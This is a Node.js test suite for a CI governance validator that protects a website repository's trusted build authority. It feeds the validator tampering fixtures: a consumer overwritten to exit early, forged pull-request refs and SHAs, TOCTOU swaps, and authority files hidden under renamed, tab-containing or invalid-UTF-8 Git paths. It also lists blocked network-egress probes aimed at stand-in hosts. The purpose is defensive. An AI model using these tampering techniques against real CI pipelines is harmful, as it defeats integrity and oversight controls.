import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { access, mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { pathToFileURL } from "node:url";
import test from "node:test";
import vm from "node:vm";

import {
  CANONICAL_AUTHORITY_PATHS,
  runBaseOnlyGitSimulation,
  runBaseOnlySimulation,
  validateOperationalReport,
  verifyMaterializedAuthoritySnapshot,
} from "../../scripts/governance/validate-f2-gov-08.mjs";
import * as portableGuard from "../../scripts/governance/validate-f2-gov-08.mjs";
import * as trustedServer from "../../scripts/governance/f2-gov-08-static-server.mjs";
import * as trustedConsumer from "../../scripts/governance/f2-gov-08-consumer.mjs";

const root = new URL("../../", import.meta.url);
const sourceRepository = decodeURIComponent(root.pathname).replace(/^\/(.:)/, "$1").replace(/\/$/, "");
const canonicalPaths = Object.values(CANONICAL_AUTHORITY_PATHS);
const canonicalAuthoritySha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: sourceRepository, encoding: "utf8" }).trim();
const canonicalBlob = (path) => execFileSync("git", ["cat-file", "blob", `${canonicalAuthoritySha}:${path}`], { cwd: sourceRepository, encoding: null });
const workingFile = (path) => readFileSync(join(sourceRepository, ...path.split("/")));
const publishedPaths = JSON.parse(canonicalBlob("deploy/publish-manifest.json").toString("utf8")).files;
const html = (title, width = 44, height = 44) => `<!doctype html><html data-drawer-capable="true" data-focus-capable="true" data-target-width="${width}" data-target-height="${height}" data-focus-target-width="48" data-focus-target-height="48"><title>${title}</title></html>`;

function assertCanonicalPlaywrightCacheBinding(consumer, runtime) {
  assert.equal(runtime.container.browsersPath, "/ms-playwright", "canonical Playwright browser cache path is absent or divergent");
  assert.match(consumer, /process\.env\.PLAYWRIGHT_BROWSERS_PATH\s*=\s*runtime\.container\.browsersPath[\s\S]*?require\("playwright"\)/, "trusted browser cache is not bound before Playwright loads");
  assert.doesNotMatch(consumer, /PLAYWRIGHT_BROWSERS_PATH\s*\|\||PLAYWRIGHT_BROWSERS_PATH\s*\?\?/, "trusted browser cache uses a fallback");
}

function assertHostOnlyObservationAuthority(consumer) {
  assert.doesNotMatch(consumer, /exposeBinding\(/, "candidate page must not receive an observation binding");
  assert.doesNotMatch(consumer, /__branctReportExternalAttempt/, "candidate page must not observe the authority channel");
  assert.doesNotMatch(consumer, /reportToken|trusted\.reportToken|randomBytes/, "candidate page must not receive an observation secret");
  assert.match(consumer, /context\.route\("\*\*"/, "trusted host-side request interception is required");
  assert.match(consumer, /context\.routeWebSocket\("\*\*"/, "trusted host-side socket interception is required");
}

function assertCanonicalConsentProbe(consumer) {
  assert.match(consumer, /consent-loader"\) return \{ mechanism: "script", url: "https:\/\/connect\.facebook\.net\/en_US\/fbevents\.js", route: "crm-gestao\.html" \}/);
  assert.match(consumer, /action === "consent-loader"[\s\S]*?route: "crm-gestao\.html"[\s\S]*?goto\(`\$\{origin\}\/crm-gestao\.html`/);
  for (const phase of ["no consent decision", "explicit consent refusal", "consent withdrawal", "consent withdrawal after valid consent"]) assert.match(consumer, new RegExp(phase));
}

const crmPixelScripts = (crmSource = canonicalBlob("crm-gestao.html").toString("utf8")) => [...crmSource.matchAll(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi)]
  .map((match) => match[1])
  .filter((source) => source.includes("__BRANCT_PIXEL_ID") || source.includes("CONSENT_KEY"));

function runCrmConsentPage(storage = new Map(), action = null, crmSource = undefined) {
  const attempts = [];
  const listeners = new Map();
  const element = (id) => ({
    hidden: true,
    classList: { add() {}, remove() {} },
    addEventListener(type, listener) { listeners.set(`${id}:${type}`, listener); },
  });
  const elements = new Map([
    ["consent-banner", element("consent-banner")],
    ["consent-accept", element("consent-accept")],
    ["consent-reject", element("consent-reject")],
  ]);
  const document = {
    createElement: () => ({ async: false, src: "" }),
    getElementsByTagName: () => [{ parentNode: { insertBefore(node) { attempts.push({ mechanism: "script", url: node.src }); } } }],
    getElementById: (id) => elements.get(id) ?? null,
    querySelectorAll: () => [],
  };
  const sandbox = {
    document,
    localStorage: {
      getItem: (key) => storage.get(key) ?? null,
      setItem: (key, value) => storage.set(key, String(value)),
      removeItem: (key) => storage.delete(key),
    },
    requestAnimationFrame: (callback) => callback(),
    setTimeout: (callback) => callback(),
    matchMedia: () => ({ matches: false }),
    console,
  };
  sandbox.window = sandbox;
  const context = vm.createContext(sandbox);
  for (const source of crmPixelScripts(crmSource)) vm.runInContext(source, context, { filename: "crm-gestao.html" });
  if (action) {
    const listener = listeners.get(`${action}:click`);
    assert.equal(typeof listener, "function", `consent action is absent: ${action}`);
    listener();
  }
  return { attempts, storage };
}

async function write(repository, path, bytes) {
  const target = join(repository, ...path.split("/"));
  await mkdir(dirname(target), { recursive: true });
  await writeFile(target, bytes);
}

function splitNulBuffers(bytes) {
  const fields = [];
  for (let start = 0; start < bytes.length;) {
    const end = bytes.indexOf(0, start);
    assert.notEqual(end, -1, "binary Git fixture is not NUL terminated");
    if (end > start) fields.push(bytes.subarray(start, end));
    start = end + 1;
  }
  return fields;
}

async function publishBinaryRootEntries(fixture, entries, message) {
  const records = splitNulBuffers(execFileSync("git", ["ls-tree", "-z", "HEAD^{tree}"], { cwd: fixture.repository, encoding: null }));
  for (const { pathBytes, content = html("binary path") } of entries) {
    const oid = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: Buffer.from(content), encoding: "utf8" }).trim();
    records.push(Buffer.concat([Buffer.from(`100644 blob ${oid}\t`, "ascii"), pathBytes]));
  }
  records.sort((left, right) => Buffer.compare(left.subarray(left.indexOf(9) + 1), right.subarray(right.indexOf(9) + 1)));
  const treeInput = Buffer.concat(records.flatMap((record) => [record, Buffer.from([0])]));
  const tree = execFileSync("git", ["mktree", "-z"], { cwd: fixture.repository, input: treeInput, encoding: "utf8" }).trim();
  const commit = execFileSync("git", ["commit-tree", tree, "-p", fixture.headSha], { cwd: fixture.repository, input: `${message}\n`, encoding: "utf8" }).trim();
  fixture.git("update-ref", "refs/heads/candidate", commit);
  fixture.git("update-ref", "refs/remotes/origin/candidate", commit);
  fixture.headSha = commit;
  fixture.event.pull_request.head.sha = commit;
  await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
}

async function createRepository() {
  const repository = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-f1-"));
  const git = (...args) => execFileSync("git", args, { cwd: repository, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
  git("init", "--quiet", "--initial-branch=main");
  git("config", "user.email", "f2-gov-08@example.invalid");
  git("config", "user.name", "F2-GOV-08 fixture");
  for (const path of canonicalPaths) await write(repository, path, canonicalBlob(path));
  await write(repository, "index.html", html("base"));
  await write(repository, "politica-privacidade.html", html("privacy"));
  await write(repository, "src/css/branct.css", ".menu{display:block}\n");
  await write(repository, "src/js/branct.js", "document.documentElement.dataset.ready='true';\n");
  git("add", ".");
  git("commit", "--quiet", "-m", "trusted base authority");
  const baseSha = git("rev-parse", "HEAD");
  git("update-ref", "refs/remotes/origin/main", baseSha);
  git("checkout", "--quiet", "-b", "candidate");
  await write(repository, "index.html", html("candidate"));
  git("add", "index.html");
  git("commit", "--quiet", "-m", "candidate live change");
  const headSha = git("rev-parse", "HEAD");
  git("update-ref", "refs/remotes/origin/candidate", headSha);
  const eventPath = join(repository, "event.json");
  const event = {
    pull_request: {
      base: { ref: "main", sha: baseSha },
      head: { ref: "candidate", sha: headSha },
    },
    repository: { full_name: "branctstudio-rgb/sitebranct" },
  };
  await writeFile(eventPath, JSON.stringify(event));
  return { repository, git, baseSha, headSha, eventPath, event };
}

const run = (fixture, extra = {}) => runBaseOnlyGitSimulation({ repository: fixture.repository, eventPath: fixture.eventPath, ...extra });

const syntheticTreeEntries = (paths) => paths.map((path, index) => ({
  mode: "100644",
  type: "blob",
  oid: (index + 1).toString(16).padStart(40, "0"),
  path,
  pathBytes: Buffer.from(path, "ascii"),
}));

function permutations(values) {
  if (values.length < 2) return [values];
  return values.flatMap((value, index) => permutations(values.filter((_, candidate) => candidate !== index)).map((rest) => [value, ...rest]));
}

function currentGitTreeEntries() {
  return splitNulBuffers(execFileSync("git", ["ls-tree", "-rz", "--full-tree", "HEAD"], { cwd: sourceRepository, encoding: null })).map((record) => {
    const tab = record.indexOf(9);
    const [mode, type, oid] = record.subarray(0, tab).toString("ascii").split(" ");
    const pathBytes = record.subarray(tab + 1);
    return { mode, type, oid, path: pathBytes.toString("ascii"), pathBytes };
  });
}

const canonicalJsonForTest = (value) => {
  if (Array.isArray(value)) return `[${value.map(canonicalJsonForTest).join(",")}]`;
  if (value && typeof value === "object") return `{${Object.keys(value).sort().map((key) => `${JSON.stringify(key)}:${canonicalJsonForTest(value[key])}`).join(",")}}`;
  return JSON.stringify(value);
};
const sha256ForTest = (value) => createHash("sha256").update(value).digest("hex");
const networkControlActionsForTest = [
  "fetch", "fetch-computed", "XMLHttpRequest", "WebSocket", "EventSource", "sendBeacon",
  "serviceWorker.register", "script", "dynamic-import", "frame", "image", "window.open",
  "location.assign", "location.replace", "location.href", "resource-hint-preconnect",
  "resource-hint-dns-prefetch", "consent-loader", "form-submit",
];
const resourceHintActionsForTest = new Set(["resource-hint-preconnect", "resource-hint-dns-prefetch"]);
const expectedControlStatusForTest = (action) => resourceHintActionsForTest.has(action)
  ? "DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN"
  : "BLOCKED_AND_RECORDED";
const expectedControlDispositionForTest = (action) => resourceHintActionsForTest.has(action)
  ? "DETECTED_AFTER_DOM_INSERTION"
  : "BLOCKED_BEFORE_EGRESS";
const expectedControlObservationForTest = (action) => {
  const target = action === "WebSocket" ? "wss://f2-gov-09.invalid/socket" : `https://f2-gov-09.invalid/${encodeURIComponent(action)}`;
  if (action === "fetch-computed") return { mechanism: "fetch", url: "https://f2-gov-09.invalid/computed", route: "about:blank" };
  if (action === "dynamic-import") return { mechanism: "script", url: target, route: "about:blank" };
  if (["location.assign", "location.replace", "location.href"].includes(action)) return { mechanism: "navigation", url: target, route: "about:blank" };
  if (["resource-hint-preconnect", "resource-hint-dns-prefetch"].includes(action)) return { mechanism: "resource-hint", url: target, route: "about:blank" };
  if (action === "consent-loader") return { mechanism: "script", url: "https://connect.facebook.net/en_US/fbevents.js", route: "crm-gestao.html" };
  if (action === "form-submit") return { mechanism: "fetch", url: "https://n8n.branct.com/webhook/site-lead", route: "contactos.html" };
  return { mechanism: action, url: target, route: action === "serviceWorker.register" ? "src/i18n/pt.json" : "about:blank" };
};

function canonicalOperationalFixture() {
  const matrixBytes = canonicalBlob(CANONICAL_AUTHORITY_PATHS.matrix);
  const expectationsBytes = canonicalBlob(CANONICAL_AUTHORITY_PATHS.expectations);
  const menuBytes = canonicalBlob(CANONICAL_AUTHORITY_PATHS.menuEvidence);
  const matrix = JSON.parse(matrixBytes.toString("utf8"));
  const menu = JSON.parse(menuBytes.toString("utf8"));
  const matrixDigest = sha256ForTest(matrixBytes);
  const baseSha = "1".repeat(40);
  const headSha = "2".repeat(40);
  const payloadDigest = "3".repeat(64);
  const authority = { files: new Map([
    ["matrix", { bytes: matrixBytes, pin: { sha256: matrixDigest } }],
    ["expectations", { bytes: expectationsBytes, pin: { sha256: sha256ForTest(expectationsBytes) } }],
    ["menuEvidence", { bytes: menuBytes, pin: { sha256: sha256ForTest(menuBytes) } }],
  ]) };
  const evidence = [];
  const reports = matrix.engines.map((engine, engineIndex) => {
    const observations = [];
    for (const route of matrix.routes) for (const [viewport] of Object.entries(matrix.viewports)) {
      const rawObservation = { overflow: engineIndex === 0 && observations.length === 0, smallTargets: engineIndex === 0 && observations.length === 0 ? [{ width: 20, height: 20 }] : [] };
      observations.push(rawObservation);
      const binding = { baseSha, headSha, matrixDigest, payloadDigest, engine, kind: "observation", route, viewport, action: "measure-responsive" };
      const identity = sha256ForTest(canonicalJsonForTest(binding));
      const semanticResult = rawObservation.overflow || rawObservation.smallTargets.length ? "FAIL" : "PASS";
      evidence.push({ ...binding, identity, rawObservation, semanticResult, digest: sha256ForTest(canonicalJsonForTest({ ...binding, identity, rawObservation, semanticResult })) });
    }
    const menuResults = menu.entries.map((entry, index) => {
      const measuredResult = index === 0 && engineIndex === 0
        ? { focusReached: false }
        : { focusReached: true, focusStyle: true, open: { expanded: "true", drawerInside: true, focusInside: true, bodyLocked: true, backgroundInert: true, closeTarget: { width: 44, height: 44 } }, closed: { closed: true, focusReturned: true }, closeButtonClosed: null, outsideClosed: null };
      const semanticResult = index === 0 && engineIndex === 0 ? "FAIL" : "PASS";
      const action = entry.actionPhases.join("+");
      const binding = { baseSha, headSha, matrixDigest, payloadDigest, engine, kind: "menu", route: entry.route, viewport: entry.viewport, action };
      const identity = sha256ForTest(canonicalJsonForTest(binding));
      const rawObservation = { measuredResult };
      evidence.push({ ...binding, identity, rawObservation, semanticResult, digest: sha256ForTest(canonicalJsonForTest({ ...binding, identity, rawObservation, semanticResult })) });
      return { semanticResult };
    });
    return {
      engine,
      version: "test-engine",
      observations,
      menuResults,
      actions: Array.from({ length: matrix.actionCountPerEngine }, (_, index) => ({ id: index, status: "COMPLETED" })),
      reducedMotion: { matches: true, maxDurationMs: 0 },
      networkIsolation: {
        policy: "LOCAL_VERIFIED_BLOBS_AND_RUNTIME_EXTERNAL_FAIL",
        cleanContext: { cookies: 0, storageOrigins: 0, serviceWorkers: 0 },
        localRequestCount: 1,
        localI18nSuccessCount: 1,
        localViolations: [],
        flowAttempts: [],
        controls: networkControlActionsForTest.map((action) => {
          const probeId = sha256ForTest(canonicalJsonForTest({ baseSha, headSha, payloadDigest, engine, action }));
          const expected = expectedControlObservationForTest(action);
          return { action, status: expectedControlStatusForTest(action), probeId, observed: [{ ...expected, origin: new URL(expected.url).origin, phase: "control-probe", engine, action, viewport: "control", disposition: expectedControlDispositionForTest(action), probeId }] };
        }),
      },
      consoleIssues: [],
      summary: { overflowCount: engineIndex === 0 ? 1 : 0, smallTargetObservationCount: engineIndex === 0 ? 1 : 0, menuFailureCount: engineIndex === 0 ? 1 : 0, reducedMotionDurationMs: 0, consoleIssueCount: 0 },
      evidence: [],
    };
  });
  return { authority, baseSha, headSha, payloadDigest, report: { complete: true, executionMode: "OPERATIONAL", conclusion: "EXPECTED_SEMANTIC_RED", capabilityInventory: [], reports, evidence } };
}

async function publishFixtureHead(fixture, message) {
  fixture.git("commit", "--quiet", "-m", message);
  fixture.headSha = fixture.git("rev-parse", "HEAD");
  fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
  fixture.event.pull_request.head.sha = fixture.headSha;
  await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
}

test("F2-GOV-08 legitimate path executes the exact base consumer and produces complete evidence", async () => {
  const fixture = await createRepository();
  try {
    const result = run(fixture);
    assert.equal(result.decision, "PASS");
    assert.equal(result.authority.baseSha, fixture.baseSha);
    assert.equal(result.authority.headSha, fixture.headSha);
    assert.equal(result.authority.contract.path, CANONICAL_AUTHORITY_PATHS.contract);
    assert.equal(result.authority.manifest.path, CANONICAL_AUTHORITY_PATHS.manifest);
    assert.equal(result.authority.origins.consumer.path, CANONICAL_AUTHORITY_PATHS.consumer);
    assert.equal(result.evidence.length, 4);
    assert.ok(result.evidence.every(({ semanticResult, digest }) => semanticResult === "PASS" && /^[0-9a-f]{64}$/.test(digest)));
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 removes every caller injection API for authority and result inputs", async (t) => {
  const fixture = await createRepository();
  try {
    for (const [name, value] of [
      ["contract", {}], ["manifest", {}], ["pins", []], ["matrix", []], ["expectations", []],
      ["consumer", "alternate"], ["baseSha", fixture.baseSha], ["headSha", fixture.headSha],
      ["readRaw", () => ({})], ["envelope", {}], ["result", "PASS"],
    ]) await t.test(name, () => assert.throws(() => run(fixture, { [name]: value }), /trusted harness input schema is not exact/i));
    assert.throws(() => runBaseOnlySimulation({}), /caller-controlled authority API was removed/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects joint contract and manifest replacement in the producer head", async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, CANONICAL_AUTHORITY_PATHS.contract, "{}\n");
    await write(fixture.repository, CANONICAL_AUTHORITY_PATHS.manifest, "{}\n");
    fixture.git("add", CANONICAL_AUTHORITY_PATHS.contract, CANONICAL_AUTHORITY_PATHS.manifest);
    fixture.git("commit", "--quiet", "-m", "joint authority replacement");
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /head changed a non-live or protected authority path|canonical .* at head changed/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, path, content] of [
  ["consumer", CANONICAL_AUTHORITY_PATHS.consumer, "process.exit(0);\n"],
  ["matrix", CANONICAL_AUTHORITY_PATHS.matrix, "[]\n"],
  ["expectations", CANONICAL_AUTHORITY_PATHS.expectations, "[]\n"],
  ["static server", CANONICAL_AUTHORITY_PATHS.staticServer, "export default {};\n"],
]) test(`F2-GOV-08 rejects producer alteration of ${label}`, async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, path, content);
    fixture.git("add", path);
    fixture.git("commit", "--quiet", "-m", `alter ${label}`);
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /head changed a non-live or protected authority path|canonical .* at head changed/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects alternate imports in the consumer authority", async () => {
  const source = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  const localImports = [...source.matchAll(/from\s+["'](\.\/[^"']+)["']/g)].map((match) => match[1]);
  assert.deepEqual(localImports, ["./f2-gov-08-static-server.mjs"]);
  const dynamicImports = [...source.matchAll(/\bimport\s*\(([^)]+)\)/g)].map((match) => match[1].trim());
  assert.deepEqual(dynamicImports, ["target"], "trusted consumer may use dynamic import only for the isolated runtime network control");
  assert.match(source, /else if \(control === "dynamic-import"\) await import\(target\);/);
  assert.match(source, /const require = createRequire\(join\(modules, "\.\.", "package\.json"\)\);\s*const playwright = require\("playwright"\);/);
  assert.equal((source.match(/\brequire\(/g) ?? []).length, 1, "trusted consumer may require only the pinned Playwright package");
});

test("F2-GOV-08 rejects event base, head, repository and ref transplantation", async (t) => {
  const fixture = await createRepository();
  try {
    const cases = [
      ["base", (event) => { event.pull_request.base.sha = "1".repeat(40); }, /cannot resolve|base/i],
      ["head", (event) => { event.pull_request.head.sha = "2".repeat(40); }, /cannot resolve|head/i],
      ["repository", (event) => { event.repository.full_name = "attacker/fork"; }, /repository is divergent/i],
      ["base ref", (event) => { event.pull_request.base.ref = "release"; }, /base ref is divergent/i],
      ["head ref", (event) => { event.pull_request.head.ref = "other"; }, /trusted head ref|cannot resolve.*origin\/other/i],
    ];
    for (const [label, mutate, expected] of cases) await t.test(label, async () => {
      const original = structuredClone(fixture.event);
      mutate(original);
      await writeFile(fixture.eventPath, JSON.stringify(original));
      assert.throws(() => run(fixture), expected);
    });
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects moved remote refs even when event SHAs remain unchanged", async (t) => {
  const fixture = await createRepository();
  try {
    fixture.git("commit", "--allow-empty", "--quiet", "-m", "untrusted ref movement");
    const moved = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", moved);
    await t.test("head ref", () => assert.throws(() => run(fixture), /trusted head ref is divergent/i));
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.git("update-ref", "refs/remotes/origin/main", moved);
    await t.test("base ref", () => assert.throws(() => run(fixture), /trusted base ref is divergent/i));
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects a non-ancestral operational base", async () => {
  const fixture = await createRepository();
  try {
    const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: "unrelated\n", encoding: "utf8" }).trim();
    const tree = execFileSync("git", ["mktree"], { cwd: fixture.repository, input: `100644 blob ${blob}\tunrelated.txt\n`, encoding: "utf8" }).trim();
    const unrelated = execFileSync("git", ["commit-tree", tree], { cwd: fixture.repository, input: "unrelated head\n", encoding: "utf8" }).trim();
    fixture.git("update-ref", "refs/remotes/origin/candidate", unrelated);
    fixture.event.pull_request.head.sha = unrelated;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /operational base is not an ancestor/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, mode, bytes, expected] of [
  ["executable mode", "100755", canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer), /canonical consumer has unexpected Git mode/i],
  ["symlink mode", "120000", Buffer.from("alternate-consumer.mjs\n"), /canonical consumer has unexpected Git mode/i],
  ["blob digest", "100644", Buffer.from("process.exit(0);\n"), /canonical consumer (size|digest) is divergent/i],
]) test(`F2-GOV-08 rejects authority ${label} at the trusted base`, async () => {
  const fixture = await createRepository();
  try {
    const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: bytes, encoding: null }).toString().trim();
    fixture.git("checkout", "--quiet", "main");
    fixture.git("update-index", "--add", "--cacheinfo", `${mode},${blob},${CANONICAL_AUTHORITY_PATHS.consumer}`);
    fixture.git("commit", "--quiet", "-m", `authority ${label}`);
    fixture.baseSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/main", fixture.baseSha);
    await write(fixture.repository, "index.html", html("candidate over altered base"));
    fixture.git("add", "index.html");
    fixture.git("commit", "--quiet", "-m", "candidate over altered base");
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.base.sha = fixture.baseSha;
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), expected);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, path, content, expected] of [
  ["unknown path", "unknown/private.txt", "private\n", /non-live|protected authority/i],
  ["producer command", "scripts/producer.mjs", "process.exit(0);\n", /non-live|protected authority/i],
  ["producer envelope", "result.json", "{\"decision\":\"PASS\"}\n", /non-live|protected authority/i],
]) test(`F2-GOV-08 rejects ${label}`, async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, path, content);
    fixture.git("add", path);
    fixture.git("commit", "--quiet", "-m", label);
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), expected);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects OBSERVATION_PAYLOAD_SWAP measured from a live candidate", async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, "index.html", html("candidate", 43, 44));
    fixture.git("add", "index.html");
    fixture.git("commit", "--quiet", "-m", "swap measured payload");
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /OBSERVATION_PAYLOAD_SWAP/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 actual materialization guard rejects TOCTOU before execution", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-toctou-"));
  try {
    const target = join(directory, "consumer.mjs");
    const bytes = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer);
    await writeFile(target, bytes);
    const manifest = JSON.parse(canonicalBlob(CANONICAL_AUTHORITY_PATHS.manifest).toString("utf8"));
    const pin = manifest.files.find(({ role }) => role === "consumer");
    const files = new Map([["consumer", { bytes, pin }]]);
    const materialized = new Map([["consumer", target]]);
    assert.doesNotThrow(() => verifyMaterializedAuthoritySnapshot(files, materialized));
    await writeFile(target, "process.exit(0);\n");
    assert.throws(() => verifyMaterializedAuthoritySnapshot(files, materialized), /TOCTOU|size changed after validation/i);
  } finally { await rm(directory, { recursive: true, force: true }); }
});

for (const [label, mutate] of [
  ["full-similarity rename to an allowed root HTML path", async (fixture) => {
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "inert.html");
  }],
  ["partial-similarity rename to an allowed root HTML path", async (fixture) => {
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "inert.html");
    await write(fixture.repository, "inert.html", `${canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8")}\n// partial rename\n`);
    fixture.git("add", "inert.html");
  }],
  ["copy followed by removal", async (fixture) => {
    await write(fixture.repository, "inert.html", canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer));
    fixture.git("rm", "--quiet", CANONICAL_AUTHORITY_PATHS.consumer);
    fixture.git("add", "inert.html");
  }],
  ["case-only path replacement", async (fixture) => {
    const changedCase = "scripts/governance/F2-GOV-08-consumer.mjs";
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "temporary-authority-name");
    fixture.git("mv", "temporary-authority-name", changedCase);
  }],
  ["rename to a path containing spaces", async (fixture) => {
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "inert authority.html");
  }],
  ["rename to a path containing unusual Unicode", async (fixture) => {
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "inert-autoridade-ç.html");
  }],
]) test(`F2-GOV-08 rejects protected consumer ${label}`, async () => {
  const fixture = await createRepository();
  try {
    await mutate(fixture);
    await publishFixtureHead(fixture, `protected consumer ${label}`);
    assert.throws(() => run(fixture), /protected authority|canonical consumer.*head|structural Git diff|portable character|not ASCII/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects an authority blob transplanted to a Git path containing a tab", async () => {
  const fixture = await createRepository();
  try {
    const oid = fixture.git("rev-parse", `HEAD:${CANONICAL_AUTHORITY_PATHS.consumer}`);
    const existing = execFileSync("git", ["ls-tree", "-z", "HEAD^{tree}"], { cwd: fixture.repository, encoding: null }).toString("utf8").split("\0").filter(Boolean);
    existing.push(`100644 blob ${oid}\tinert\tauthority.html`);
    existing.sort((left, right) => left.slice(left.indexOf("\t") + 1).localeCompare(right.slice(right.indexOf("\t") + 1), "en"));
    const tree = execFileSync("git", ["mktree", "-z"], { cwd: fixture.repository, input: Buffer.from(`${existing.join("\0")}\0`), encoding: "utf8" }).trim();
    const commit = execFileSync("git", ["commit-tree", tree, "-p", fixture.headSha], { cwd: fixture.repository, input: "tab path authority transplant\n", encoding: "utf8" }).trim();
    fixture.git("update-ref", "refs/heads/candidate", commit);
    fixture.git("update-ref", "refs/remotes/origin/candidate", commit);
    fixture.headSha = commit;
    fixture.event.pull_request.head.sha = commit;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /protected authority blob was transplanted|protected authority|forbidden portable character/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, invalidBytes] of [
  ["isolated invalid byte", [0xff]],
  ["truncated sequence", [0xe2, 0x82]],
  ["continuation byte without a starter", [0x80]],
  ["overlong encoding", [0xc0, 0xaf]],
  ["encoded surrogate", [0xed, 0xa0, 0x80]],
]) test(`F2-GOV-08 rejects ${label} in a Git path before policy classification`, async () => {
  const fixture = await createRepository();
  try {
    const pathBytes = Buffer.concat([Buffer.from("inert-", "ascii"), Buffer.from(invalidBytes), Buffer.from(".html", "ascii")]);
    await publishBinaryRootEntries(fixture, [{ pathBytes }], `invalid UTF-8: ${label}`);
    assert.throws(() => run(fixture), /Git path is not canonical UTF-8|invalid UTF-8/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects distinct invalid byte paths instead of collapsing both to replacement characters", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [
      { pathBytes: Buffer.concat([Buffer.from("inert-", "ascii"), Buffer.from([0xff]), Buffer.from(".html", "ascii")]) },
      { pathBytes: Buffer.concat([Buffer.from("inert-", "ascii"), Buffer.from([0xfe]), Buffer.from(".html", "ascii")]) },
    ], "invalid UTF-8 collision");
    assert.throws(() => run(fixture), /Git path is not canonical UTF-8|invalid UTF-8/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects Unicode because the current portable path inventory is ASCII-only", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [{ pathBytes: Buffer.from("página.html", "utf8") }], "valid NFC UTF-8 path");
    assert.throws(() => run(fixture), /Git path is not ASCII|ASCII-only/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects a canonically equivalent decomposed Unicode live path", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [{ pathBytes: Buffer.from("pa\u0301gina.html", "utf8") }], "decomposed Unicode path");
    assert.throws(() => run(fixture), /Git path is not ASCII|ASCII-only/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

